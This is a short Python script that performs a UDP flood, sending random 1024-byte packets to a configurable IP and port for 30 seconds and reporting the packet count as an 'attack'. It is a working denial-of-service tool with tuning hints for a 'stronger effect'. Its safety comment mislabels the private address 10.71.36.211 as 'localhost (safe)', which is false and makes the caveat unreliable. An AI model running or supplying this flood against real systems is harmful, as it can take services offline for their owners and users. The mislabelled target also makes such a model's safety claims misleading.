import socket
import random
import time

# ⚠️ TARGET: ONLY YOUR OWN SYSTEM OR TEST SERVER
TARGET_IP = "10.71.36.211"     # localhost (safe)
TARGET_PORT = 80            # any open port (80 / 5000 / etc.)

DURATION_SECONDS = 30       # increase to 60 for stronger effect
PACKET_SIZE = 1024          # bytes (can try 2048)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(PACKET_SIZE)

print("🔥 Starting HIGH-INTENSITY UDP Flood")
print(f"Target: {TARGET_IP}:{TARGET_PORT}")
print(f"Duration: {DURATION_SECONDS} seconds")

start_time = time.time()
sent_packets = 0

while time.time() - start_time < DURATION_SECONDS:
    sock.sendto(payload, (TARGET_IP, TARGET_PORT))
    sent_packets += 1

print(f"✅ Attack finished. Packets sent: {sent_packets}")
